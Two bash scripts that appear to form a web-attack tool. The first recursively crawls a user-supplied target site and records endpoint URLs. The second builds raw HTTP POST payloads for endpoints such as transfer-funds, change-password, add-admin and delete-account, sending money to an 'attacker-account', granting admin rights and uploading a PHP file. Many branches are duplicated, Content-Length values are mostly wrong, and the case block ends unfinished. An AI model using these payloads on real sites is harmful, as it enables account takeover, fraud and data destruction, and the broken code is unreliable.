#!/bin/bash
echo "We are removing the pre-exist urls.txt"
echo "Don't worry, after finishing the scan"
echo "it will create a new one."
rm -r urls.txt
# Function to extract URLs from a webpage
extract_urls() {
    local webpage="$1"
    # Use grep with Perl-compatible regular expressions to extract URLs
    grep -Po '(?<=href=")([^"]*)(?=")' <<< "$webpage"
}

# Function to check if a URL is an endpoint
is_endpoint() {
    local url="$1"
    # Check if the URL ends with a file extension or has a query string
    if [[ "$url" =~ \.(html?|php|asp|aspx|jsp|py|cgi|pl|xml|json|txt|css|js|rb|java|dll|exe|bin|sh|bat|cmd)(\?.*)?$ ]]; then
        return 0 # It's an endpoint
    else
        return 1 # It's not an endpoint
    fi
}

# Function to crawl a website recursively
crawl_website() {
    local url="$1"
    local visited_urls=()

    # Start crawling with the provided URL
    crawl_recursive "$url"
}

# Function to recursively crawl URLs
crawl_recursive() {
    local url="$1"
    local webpage
    local urls

    # Check if the URL has already been visited to avoid infinite loops
    if [[ "${visited_urls[*]}" =~ "$url" ]]; then
        return
    fi

    # Fetch the webpage content
    webpage=$(curl -s "$url")

    # Extract URLs from the webpage
    urls=$(extract_urls "$webpage")

    # Iterate over each extracted URL
    for u in $urls; do
        # Check if the URL is an endpoint
        if is_endpoint "$u"; then
            echo "Endpoint: $u"
            # Append the endpoint URL (with '/' added before it) to the file
            echo "Corresponding URL: $url$u"
            echo "$url/$u" >> urls.txt  
            echo >> urls.txt  # Add a new line for better readability in the file
        fi

        # If the URL is not an endpoint and is within the same domain, crawl it recursively
        if [[ "$u" == /* ]]; then
            crawl_recursive "$url$u"
        fi
    done

    # Mark the current URL as visited
    visited_urls+=("$url")
}

# Main function
main() {
    local start_url="$1"
    # Start crawling the website
    crawl_website "$start_url"
}

# Ensure that the urls.txt file exists or create it if it doesn't
touch urls.txt

# Prompt the user to enter the target website URL
read -p "Enter your target website link with http:// or https:// : " target_url

# Check if a URL argument is provided
if [[ -z "$target_url" ]]; then
    echo "You must provide a target website URL."
    exit 1
fi

# Call the main function with the provided URL
main "$target_url"

#!/bin/bash
# This is a comment

# Function to determine the appropriate payload based on URL pattern
get_payload() {
    local url="$1"
    local payload

    # Check the URL pattern and select the corresponding payload
    case "$url" in
        */transfer-funds)
            # Payload for transfer funds action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\namount=1000&destination=attacker-account"
            ;;
        */change-password)
            # Payload for change password action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker&password=newpassword"
            ;;
        */add-admin)
            # Payload for add admin action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker&role=admin"
            ;;
        */delete-account)
            # Payload for delete account action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\naccount=attacker-account"
            ;;
        */reset-password)
            # Payload for reset password action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nuser=attacker&newpassword=newpassword"
            ;;
        */unlock-account)
            # Payload for unlock account action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker"
            ;;
        */subscribe-newsletter)
            # Payload for subscribe to newsletter action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nemail=attacker@example.com"
            ;;
        */update-profile)
            # Payload for update profile action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker&email=attacker@example.com"
            ;;
        */post-comment)
            # Payload for posting a comment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Attacker's comment"
            ;;
        */create-event)
            # Payload for creating an event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ntitle=Malicious Event&description=This is a malicious event created by the attacker"
            ;;
        */send-message)
            # Payload for sending a message action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nmessage=Malicious message from the attacker"
            ;;
        */create-group)
            # Payload for creating a group action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ngroup_name=Malicious Group&description=This is a malicious group created by the attacker"
            ;;
        */make-payment)
            # Payload for making a payment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nrecipient=attacker-account&amount=100"
            ;;
        */apply-for-loan)
            # Payload for applying for a loan action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\namount=100000&purpose=Malicious purpose&term=12"
            ;;
        */update-settings)
            # Payload for updating settings action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nsetting=malicious_value"
            ;;
        */send-invitation)
            # Payload for sending invitation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ninvitee=attacker@example.com"
            ;;
        */add-contact)
            # Payload for adding a contact action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncontact=attacker@example.com"
            ;;
        */upload-file)
            # Payload for uploading a file action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 213\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious_file.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 'Malicious content'; ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
            ;;
        */subscribe)
            # Payload for subscription action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nemail=attacker@example.com"
            ;;
        */vote-poll)
            # Payload for voting in a poll action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\nvote_option=malicious"
            ;;
        */apply-job)
            # Payload for applying for a job action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\nname=attacker&resume=malicious_resume.pdf"
            ;;
        */create-article)
            # Payload for creating an article action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\n\r\ntitle=Malicious Article&content=Malicious content"
            ;;
        */submit-feedback)
            # Payload for submitting feedback action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nfeedback=Malicious feedback"
            ;;
        */request-quote)
            # Payload for requesting a quote action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nproduct=Malicious product&quantity=1"
            ;;
        */send-invite)
            # Payload for sending an invite action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\ninvitee_email=attacker@example.com&message=malicious"
            ;;
        */create-post)
            # Payload for creating a post action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\npost_title=Malicious Post&post_content=Malicious content"
            ;;
        */apply-discount)
            # Payload for applying a discount action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\ndiscount_code=malicious_code"
            ;;
        */schedule-meeting)
            # Payload for scheduling a meeting action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\ntime=malicious_time&location=Malicious place"
            ;;
        */submit-order)
            # Payload for submitting an order action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nproduct_id=malicious&quantity=1"
            ;;
        */create-event)
            # Payload for creating an event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\n\r\ntitle=Malicious Event&description=Malicious description"
            ;;
        */upload-document)
            # Payload for uploading a document action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 202\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"document\"; filename=\"malicious_document.pdf\"\r\nContent-Type: application/pdf\r\n\r\n<Malicious content>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
            ;;
        */apply-promo)
            # Payload for applying a promo code action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 26\r\n\r\npromo_code=malicious_code"
            ;;
        */like-post)
            # Payload for liking a post action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\npost_id=malicious_post_id"
            ;;
        */share-article)
            # Payload for sharing an article action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\narticle_id=malicious_article_id&share_to=all"
            ;;
        */add-comment)
            # Payload for adding a comment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Malicious comment content"
            ;;
        */submit-review)
            # Payload for submitting a review action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\nproduct_id=malicious_product_id&rating=1"
            ;;
        */add-to-cart)
            # Payload for adding to cart action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nitem_id=malicious_item_id"
            ;;
        */request-demo)
            # Payload for requesting a demo action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nname=Attacker&email=attacker@example.com"
            ;;
        */add-to-wishlist)
            # Payload for adding to wishlist action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nitem_id=malicious_item_id"
            ;;
        */join-group)
            # Payload for joining a group action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\ngroup_id=malicious_group_id"
            ;;
        */submit-ticket)
            # Payload for submitting a support ticket action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\ntitle=Malicious Ticket&description=Malicious description"
            ;;
        */add-to-favorites)
            # Payload for adding to favorites action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nitem_id=malicious_item_id"
            ;;
        */subscribe-news)
            # Payload for subscribing to news action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nemail=attacker@example.com"
            ;;
        */enroll-course)
            # Payload for enrolling in a course action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\ncourse_id=malicious_course_id"
            ;;
        */add-calendar-event)
            # Payload for adding a calendar event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\n\r\ntitle=Malicious Event&date=2024-02-21"
            ;;
        */create-alert)
            # Payload for creating an alert action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nkeyword=malicious_keyword"
            ;;
        */send-request)
            # Payload for sending a request action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nto_user=malicious_user&message=Hi"
            ;;
        */create-challenge)
            # Payload for creating a challenge action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\n\r\ntitle=Malicious Challenge&description=Malicious description"
            ;;
        */submit-form)
            # Payload for submitting a form action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nfield1=value1&field2=value2&field3=value3"
            ;;
        */request-quote)
            # Payload for requesting a quote action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nproduct_id=malicious_product_id"
            ;;
        */create-poll)
            # Payload for creating a poll action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\ntitle=Malicious Poll&options=Option1,Option2"
            ;;
        */purchase-item)
            # Payload for purchasing an item action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 30\r\n\r\nitem_id=malicious_item_id&quantity=1"
            ;;
        */rate-product)
            # Payload for rating a product action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nproduct_id=malicious_product_id&rating=5"
            ;;
        */create-folder)
            # Payload for creating a folder action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nfolder_name=Malicious%20Folder"
            ;;
        */send-message)
            # Payload for sending a message action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\nrecipient=attacker&message=Malicious%20message"
            ;;
        */submit-feedback)
            # Payload for submitting feedback action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\nrating=1&comment=Malicious%20feedback"
            ;;
        */create-album)
            # Payload for creating an album action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nalbum_name=Malicious%20Album&privacy=public"
            ;;
        */apply-job)
            # Payload for applying for a job action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\njob_id=malicious_job_id&resume=resume.pdf"
            ;;
        */send-invitation)
            # Payload for sending an invitation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 47\r\n\r\nguest_email=attacker@example.com&message=Malicious"
            ;;
        */create-post)
            # Payload for creating a post action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\n\r\npost_title=Malicious%20Title&post_content=Malicious%20content"
            ;;
        */send-invite)
            # Payload for sending an invite action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\ninvitee_email=attacker@example.com&message=malicious"
            ;;
        */create-event)
            # Payload for creating an event action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\n\r\ntitle=Malicious%20Event&description=Malicious%20description"
            ;;
        */upload-file)
            # Payload for uploading a file action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 213\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious_file.txt\"\r\nContent-Type: text/plain\r\n\r\n<Malicious content>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
            ;;
        */apply-discount)
            # Payload for applying a discount action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\ndiscount_code=malicious_discount_code"
            ;;
        */create-task)
            # Payload for creating a task action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\ntask_title=Malicious%20Task&task_description=Malicious%20description"
            ;;
        */apply-coupon)
            # Payload for applying a coupon action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\ncoupon_code=malicious_coupon_code"
            ;;
        */schedule-appointment)
            # Payload for scheduling an appointment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\n\r\ntime=2024-02-21T10:00:00&location=Malicious"
            ;;
        */add-review)
            # Payload for adding a review action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nproduct_id=malicious_product_id&rating=5"
            ;;
        */create-account)
            # Payload for creating an account action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\n\r\nusername=malicious_user&password=malicious_pass"
            ;;
        */delete-item)
            # Payload for deleting an item action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 26\r\n\r\nitem_id=malicious_item_id"
            ;;
        */change-password)
            # Payload for changing password action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\nold_password=old_pass&new_password=new_pass"
            ;;
        */send-invitation)
            # Payload for sending an invitation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 47\r\n\r\nguest_email=attacker@example.com&message=Malicious"
            ;;
        */update-profile)
            # Payload for updating profile information action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nname=Attacker&email=attacker@example.com"
            ;;
        */reset-password)
            # Payload for resetting password action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nuser_email=attacker@example.com"
            ;;
        */change-email)
            # Payload for changing email address action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\n\r\nold_email=old_email@example.com&new_email=new_email@example.com"
            ;;
        */delete-account)
            # Payload for deleting account action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nuser_id=attacker_user_id"
            ;;
        */add-friend)
            # Payload for adding a friend action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 28\r\n\r\nfriend_id=attacker_friend_id"
            ;;
        */create-board)
            # Payload for creating a board action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nboard_name=Malicious%20Board"
            ;;
        */add-tag)
            # Payload for adding a tag action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 25\r\n\r\ntag_name=malicious_tag"
            ;;
        */create-document)
            # Payload for creating a document action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\ndoc_title=Malicious%20Document&content=Malicious%20content"
            ;;
        */add-task)
            # Payload for adding a task action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\ntask_name=Malicious%20Task&due_date=2024-02-21"
            ;;
        */update-status)
            # Payload for updating status action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nstatus=Malicious%20Status"
            ;;
        */create-survey)
            # Payload for creating a survey action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\nsurvey_title=Malicious%20Survey&questions=Q1,Q2,Q3"
            ;;
        */add-attachment)
            # Payload for adding an attachment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 213\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious_file.txt\"\r\nContent-Type: text/plain\r\n\r\n<Malicious content>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
            ;;
        */create-presentation)
            # Payload for creating a presentation action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\npresentation_title=Malicious%20Presentation&slides=Slide1,Slide2"
            ;;
        */add-sticky-note)
            # Payload for adding a sticky note action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nnote_title=Malicious%20Note&content=Malicious%20content"
            ;;
        */create-poll)
            # Payload for creating a poll action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\ntitle=Malicious%20Poll&options=Option1,Option2"
            ;;
        */add-event)
            # Payload for adding an event action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\ntitle=Malicious%20Event&date=2024-02-21"
            ;;
        */create-schedule)
            # Payload for creating a schedule action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\n\r\nschedule_title=Malicious%20Schedule&time=10:00AM"
            ;;
        */add-comment)
            # Payload for adding a comment action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Malicious%20Comment"
            ;;
        */create-list)
            # Payload for creating a list action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nlist_name=Malicious%20List"
            ;;
        */update-settings)
            # Payload for updating settings action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nsetting_name=Malicious%20Setting&value=new_value"
            ;;
        */add-note)
            # Payload for adding a note action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nnote=Malicious%20Note"
            ;;
        */create-agenda)
            # Payload for creating an agenda action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nagenda_title=Malicious%20Agenda&date=2024-02-21"
            ;;
        */add-quote)
            # Payload for adding a quote action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nquote=Malicious%20Quote"
            ;;
        */create-alarm)
            # Payload for creating an alarm action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\n\r\nalarm_title=Malicious%20Alarm&time=10:00AM"
            ;;
        */add-reminder)
            # Payload for adding a reminder action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\n\r\nreminder=Malicious%20Reminder"
            ;;
        */create-survey)
            # Payload for creating a survey action (alternative)
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\nsurvey_title=Malicious%20Survey&questions=Q1,Q2,Q3"
            ;;
        */add-option)
            # Payload for adding an option action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\noption=Malicious%20Option"
            ;;
        */create-petition)
            # Payload for creating a petition action
            payload="POST $url HTTP/1.1\r\nHost: $(echo "$url" | awk -F/ '{print $3}')\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\npetition_title=Malicious%20Petition&description=Malicious%20description"
            ;;
